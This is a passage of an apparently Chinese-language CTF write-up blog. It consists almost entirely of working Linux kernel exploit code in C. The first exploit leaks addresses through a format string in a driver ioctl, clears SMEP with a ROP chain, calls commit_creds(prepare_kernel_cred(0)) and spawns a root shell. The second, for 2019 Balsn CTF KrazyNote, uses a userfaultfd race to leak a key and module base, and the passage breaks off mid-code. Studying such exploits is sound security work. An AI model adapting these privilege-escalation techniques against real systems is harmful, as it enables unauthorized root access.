class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uread</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0xDEADBEEF</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x73311337</span>,size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x13377331</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rsp,user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">        <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">        <span class="string">"mov user_rsp,rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_rflags;"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Save success!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]Root now!!!"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Not root..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save();</span><br><span class="line">    signal(SIGSEGV,get_shell);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/meizijiutql"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Open error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x10000</span>);</span><br><span class="line">    memset(buf,'\x00',0x10000);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf,<span class="string">"%lx%lx%lx%lx%lx%lx %lx%lx%lx%lx %lx%lx "</span>);</span><br><span class="line">    write(fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">    uread(fd);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"dmesg | grep deadbeef &gt; leak.txt"</span>);</span><br><span class="line">    FILE* leak_fd = fopen(<span class="string">"leak.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(leak_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Oh..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fgets(buf,<span class="number">0x100</span>,leak_fd);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> kernel_base = strtoull(buf+<span class="number">27</span>,<span class="literal">NULL</span>,<span class="number">16</span>) - <span class="number">0x1c827f</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]kernel_base = %p\n"</span>,kernel_base);</span><br><span class="line">    commit_creds = kernel_base + <span class="number">0x81410</span>;</span><br><span class="line">    prepare_kernel_cred = kernel_base + <span class="number">0x81790</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_base = strtoull(buf+<span class="number">27</span>+<span class="number">1</span>+<span class="number">17</span>+<span class="number">0x10</span>+<span class="number">0x10</span>,<span class="literal">NULL</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]stack_base = %p\n"</span>,stack_base);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">"/dev/meizijiutql"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Oh..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">250</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">new</span>(fd,<span class="number">0xff0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0xff0</span>);    </span><br><span class="line">    *(<span class="keyword">size_t</span>*)(buf+<span class="number">0x1000</span>) = stack_base-(<span class="number">0xd8</span><span class="number">-0x50</span>);</span><br><span class="line">    write(fd,buf,<span class="number">0x1008</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0xff0</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">size_t</span>*)buf = kernel_base + <span class="number">0x1388</span>; <span class="comment">//pop rdi;ret;</span></span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">1</span>) = <span class="number">0x6f0</span>;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">2</span>) = kernel_base + <span class="number">0x4e5b1</span>; <span class="comment">//mov cr4, rdi; push rdx; popfq; ret; </span></span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">3</span>) = kernel_base + <span class="number">0x1388</span>;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">5</span>) = prepare_kernel_cred;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">6</span>) = kernel_base + <span class="number">0x9e2959</span>;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">7</span>) = commit_creds;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">8</span>) = kernel_base + <span class="number">0x1388</span>;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">8</span>) = kernel_base + <span class="number">0xa00d5a</span>;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">9</span>) = <span class="number">0</span>;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">10</span>) = kernel_base + <span class="number">0x21762</span>;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">11</span>) = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">12</span>) = user_cs;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">13</span>) = user_rflags;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">14</span>) = user_rsp;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">15</span>) = user_ss;</span><br><span class="line">    </span><br><span class="line">    write(fd,buf,<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/15/5IVaTP1u4CeqMZL.png" alt="x1.PNG"></p>
<h1 id="2019BalsnCTF-KrazyNote"><a href="#2019BalsnCTF-KrazyNote" class="headerlink" title="2019BalsnCTF_KrazyNote"></a>2019BalsnCTF_KrazyNote</h1><h2 id="解法一：-4"><a href="#解法一：-4" class="headerlink" title="解法一："></a>解法一：</h2><p>修改<code>cred</code></p>
<h2 id="exp：-17"><a href="#exp：-17" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -static -pthread xx.c -g -o xx</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FAULT_PAGE ((void*)0x1337000)</span></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> index;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">char</span> * buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_chunk</span>* <span class="title">user_ptr</span>;</span></span><br><span class="line"><span class="keyword">char</span> user_buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new</span><span class="params">(<span class="keyword">size_t</span> size,<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    user_ptr-&gt;size = size;</span><br><span class="line">    user_ptr-&gt;buf = buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0xffffff00</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">       <span class="built_in">puts</span>(<span class="string">"[:(]new error..."</span>);</span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">-1</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">size_t</span> index,<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    user_ptr-&gt;index = index;</span><br><span class="line">    user_ptr-&gt;buf = buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0xffffff02</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">       <span class="built_in">puts</span>(<span class="string">"[:(]show error..."</span>);</span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">-1</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0xffffff03</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]delete error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">size_t</span> index,<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    user_ptr-&gt;index = index;</span><br><span class="line">    user_ptr-&gt;buf = buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0xffffff01</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]edit error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handle</span><span class="params">(<span class="keyword">void</span>* uffd)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">mypollfd</span>;</span></span><br><span class="line"></span><br><span class="line">    mypollfd.fd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)uffd;</span><br><span class="line">    mypollfd.events = POLLIN;</span><br><span class="line">    <span class="keyword">int</span> re = poll(&amp;mypollfd,<span class="number">1</span>,<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span>(re &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Catch error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]I catch it!!!"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">delete</span>();</span><br><span class="line">    <span class="keyword">new</span>(<span class="number">0</span>,user_buf); <span class="comment">//0</span></span><br><span class="line">    <span class="keyword">new</span>(<span class="number">0</span>,user_buf); <span class="comment">//1</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">	memset(user_buf,'\x00',sizeof(user_buf));</span><br><span class="line">	user_buf[<span class="number">8</span>] = <span class="number">0xf0</span>; </span><br><span class="line"></span><br><span class="line">	uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)user_buf;</span><br><span class="line">	uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)FAULT_PAGE;</span><br><span class="line">	uc.len = <span class="number">0x1000</span>;</span><br><span class="line">	uc.mode = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(ioctl(uffd,UFFDIO_COPY,&amp;uc) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]UFFDIO_COPY error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;  <span class="comment">// 恢复执行copy_from_user</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"[:)]UFFDIO_COPY done!!!"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_uffd</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">myapi</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">myuffd</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> pt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line"></span><br><span class="line">    myapi.api = UFFD_API;</span><br><span class="line">    myapi.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_API,&amp;myapi) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Api error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(mmap(FAULT_PAGE,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>) != FAULT_PAGE)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]mmap error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    myuffd.range.start = FAULT_PAGE;</span><br><span class="line">    myuffd.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    myuffd.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_REGISTER,&amp;myuffd) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Register error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> re = pthread_create(&amp;pt,<span class="literal">NULL</span>,handle,(<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span>(re != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Create pthread error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">"/dev/note"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]open error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    user_ptr = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    memset(user_buf,'\x00',sizeof(user_buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>(<span class="number">0x10</span>,user_buf); <span class="comment">//0</span></span><br><span class="line">    register_uffd();</span><br><span class="line">    edit(<span class="number">0</span>,FAULT_PAGE);</span><br><span class="line"></span><br><span class="line">    show(<span class="number">1</span>,user_buf);</span><br><span class="line">    <span class="keyword">size_t</span> key = *(<span class="keyword">size_t</span>*)user_buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]key = %p\n"</span>,key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>(<span class="number">0</span>,user_buf);</span><br><span class="line">    show(<span class="number">1</span>,user_buf);</span><br><span class="line">    <span class="keyword">size_t</span> <span class="keyword">module</span> = *((<span class="keyword">size_t</span>*)user_buf+<span class="number">2</span>) ^ key;</span><br><span class="line">    <span class="keyword">module</span> -= <span class="number">0x2568</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]module = %p\n"</span>,<span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = <span class="keyword">module</span> + <span class="number">0x165</span>;</span><br><span class="line">    <span class="keyword">size_t</span>* tmp_buf = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    